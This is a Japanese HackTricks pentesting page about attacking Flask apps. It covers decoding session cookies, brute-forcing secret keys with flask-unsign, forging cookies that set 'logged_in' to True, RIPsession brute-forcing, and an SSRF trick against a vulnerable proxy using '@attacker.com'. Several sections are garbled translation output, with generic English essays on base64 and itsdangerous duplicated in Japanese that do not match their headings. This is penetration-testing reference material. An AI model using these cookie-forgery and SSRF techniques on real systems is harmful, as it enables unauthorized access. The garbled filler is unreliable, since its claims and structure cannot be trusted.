# Flask

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**して**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**おそらく、CTFをプレイしている場合、Flaskアプリケーションは** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**に関連しているでしょう。**

## Cookies

デフォルトのクッキーセッション名は**`session`**です。

### デコーダー

オンラインのFlaskクッキーデコーダー：[https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### 手動

最初のドットまでのクッキーの最初の部分を取得し、Base64でデコードします>
```bash
echo "ImhlbGxvIg" | base64 -d
```
クッキーはパスワードを使用して署名されています。

### **Flask-Unsign**

秘密のキーを推測して、Flaskアプリケーションのセッションクッキーを取得、デコード、ブルートフォース、および作成するためのコマンドラインツールです。

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Cookieのデコード**

```plaintext
The first step in analyzing a web application is to understand how it handles user sessions. One common method is through the use of cookies. Cookies are small pieces of data that are stored on the user's browser and are sent back to the server with each request.

In some cases, the cookies may be encoded or encrypted to protect the data they contain. To analyze the contents of a cookie, you will need to decode it.

There are several tools and techniques available to decode cookies. One popular tool is the "base64" encoding scheme. Base64 is a binary-to-text encoding scheme that represents binary data in an ASCII string format.

To decode a cookie using base64, you can use online tools or command-line utilities. For example, you can use the following command in a Linux terminal:

```bash
echo -n "SGVsbG8gd29ybGQ=" | base64 -d
```

This command will decode the base64-encoded string "SGVsbG8gd29ybGQ=" and output the decoded value "Hello world".

By decoding a cookie, you can gain insight into the data it contains and potentially identify any vulnerabilities or security issues. It is an essential step in the process of web application penetration testing.
```

Cookieのデコード
----------------

ウェブアプリケーションの解析の最初のステップは、ユーザーセッションの処理方法を理解することです。一般的な方法の1つは、Cookieを使用することです。Cookieは、ユーザーのブラウザに保存され、各リクエストと共にサーバーに送信される小さなデータの塊です。

場合によっては、Cookieに含まれるデータを保護するために、Cookieがエンコードまたは暗号化されていることがあります。Cookieの内容を解析するには、それをデコードする必要があります。

Cookieをデコードするためには、いくつかのツールや技術が利用できます。人気のあるツールの1つは、"base64"エンコーディングスキームです。Base64は、バイナリデータをASCII文字列形式で表現するバイナリからテキストへのエンコーディングスキームです。

base64を使用してCookieをデコードするには、オンラインツールやコマンドラインユーティリティを使用できます。たとえば、Linuxのターミナルで次のコマンドを使用できます。

```bash
echo -n "SGVsbG8gd29ybGQ=" | base64 -d
```

このコマンドは、base64でエンコードされた文字列 "SGVsbG8gd29ybGQ=" をデコードし、デコードされた値 "Hello world" を出力します。

Cookieをデコードすることで、それが含むデータを把握し、潜在的な脆弱性やセキュリティの問題を特定することができます。これは、ウェブアプリケーションのペネトレーションテストのプロセスにおいて重要なステップです。
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **ブルートフォース攻撃**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **署名**

Signing is a process used to verify the authenticity and integrity of data. In the context of web applications, signing is often used to ensure that data sent between the client and the server has not been tampered with.

In Flask, signing can be achieved using the `itsdangerous` library. This library provides a `Signer` class that can be used to sign and verify data.

To sign data in Flask, you first need to create a signer object by passing a secret key to the `Signer` class. The secret key should be a long and random string that is kept secret.

```python
from itsdangerous import Signer

secret_key = "mysecretkey"
signer = Signer(secret_key)
```

Once you have a signer object, you can use the `sign` method to sign data. The `sign` method takes a string as input and returns a signed string.

```python
data = "Hello, world!"
signed_data = signer.sign(data)
```

To verify the signed data, you can use the `unsign` method. The `unsign` method takes a signed string as input and returns the original data if the signature is valid. If the signature is invalid or the data has been tampered with, an exception will be raised.

```python
try:
    original_data = signer.unsign(signed_data)
    print(original_data)
except:
    print("Invalid signature")
```

By using signing in your Flask applications, you can ensure the integrity and authenticity of data transmitted between the client and the server. This can help prevent data tampering and unauthorized access to sensitive information.

#### **署名**

署名はデータの真正性と完全性を検証するために使用されるプロセスです。Webアプリケーションの文脈では、署名はクライアントとサーバー間で送信されるデータが改ざんされていないことを保証するためによく使用されます。

Flaskでは、`itsdangerous`ライブラリを使用して署名を実現することができます。このライブラリは、データの署名と検証を行うために使用できる`Signer`クラスを提供しています。

Flaskでデータに署名するには、まず`Signer`クラスに秘密鍵を渡すことで署名オブジェクトを作成する必要があります。秘密鍵は長くランダムな文字列であり、秘密に保持する必要があります。

```python
from itsdangerous import Signer

secret_key = "mysecretkey"
signer = Signer(secret_key)
```

署名オブジェクトを持っている場合、`sign`メソッドを使用してデータに署名することができます。`sign`メソッドは文字列を入力として受け取り、署名された文字列を返します。

```python
data = "Hello, world!"
signed_data = signer.sign(data)
```

署名されたデータを検証するには、`unsign`メソッドを使用することができます。`unsign`メソッドは署名された文字列を入力として受け取り、署名が有効であれば元のデータを返します。署名が無効であるか、データが改ざんされている場合は例外が発生します。

```python
try:
    original_data = signer.unsign(signed_data)
    print(original_data)
except:
    print("無効な署名です")
```

Flaskアプリケーションで署名を使用することで、クライアントとサーバー間で送信されるデータの完全性と真正性を保証することができます。これにより、データの改ざんや機密情報への不正アクセスを防ぐことができます。
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### レガシー（古いバージョン）を使用した署名

Legacy versions of Flask, specifically versions 0.9 and earlier, use a different method for signing cookies compared to newer versions. This older method is considered less secure and should be avoided if possible.

To sign cookies using legacy versions of Flask, you can use the `itsdangerous` library. This library provides a `URLSafeSerializer` class that can be used to sign and verify cookies.

Here is an example of how to sign a cookie using the legacy method:

```python
from itsdangerous import URLSafeSerializer

# Create a serializer with a secret key
serializer = URLSafeSerializer('your_secret_key')

# Sign the cookie value
signed_value = serializer.dumps('cookie_value')

# Set the signed cookie in the response
response.set_cookie('cookie_name', signed_value)
```

To verify the signed cookie, you can use the `loads` method of the serializer:

```python
from itsdangerous import BadSignature

# Get the signed cookie value from the request
signed_value = request.cookies.get('cookie_name')

try:
    # Verify the signed cookie value
    cookie_value = serializer.loads(signed_value)
except BadSignature:
    # Handle invalid signature
    pass
```

It is recommended to upgrade to a newer version of Flask and use the updated signing method for improved security.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

flask-unsignを使用して作成されたクッキーを使用してウェブサイトをブルートフォースするためのコマンドラインツールです。

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### FlaskセッションクッキーのSQLiとSQLmap

[**この例**](../../pentesting-web/sql-injection/sqlmap/#eval)では、既知の秘密を使用して、sqlmapの`eval`オプションを使用してFlaskに対して自動的にsqlmapペイロードに署名します。

## Flaskプロキシを使用したSSRF

[**この解説記事**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)では、Flaskが「@」文字で始まるリクエストを許可する方法が説明されています。
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
次のシナリオの中で、どれが当てはまりますか？
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
"@attacker.com"のようなものを導入することで、**SSRF**を引き起こすことができます。

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフロー**を簡単に構築し、自動化することができます。
今すぐアクセスを取得してください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)をご覧ください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
